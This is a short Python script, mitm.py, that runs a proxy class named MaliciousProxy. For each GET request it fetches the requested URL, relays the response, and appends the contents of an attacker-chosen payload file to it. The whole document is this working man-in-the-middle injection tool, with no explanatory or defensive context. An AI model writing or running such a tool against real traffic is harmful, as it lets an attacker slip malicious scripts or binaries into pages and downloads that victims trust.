import http.server
import urllib.request
import socketserver
import sys

if len(sys.argv) < 3:
    print('Usage: python3 mitm.py <port> <payload file>')
    exit(1)

class MaliciousProxy(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        print('[*] Got request for: {}'.format(self.path))
        self.send_response(200)
        self.end_headers()
        self.copyfile(urllib.request.urlopen(self.path), self.wfile)
        # send payload request
        with open(sys.argv[2], 'rb') as f:
            self.wfile.write(f.read())        

port = int(sys.argv[1])
server = socketserver.ThreadingTCPServer(("", port), MaliciousProxy)
print("[*] Serving on port {}".format(port))
server.serve_forever()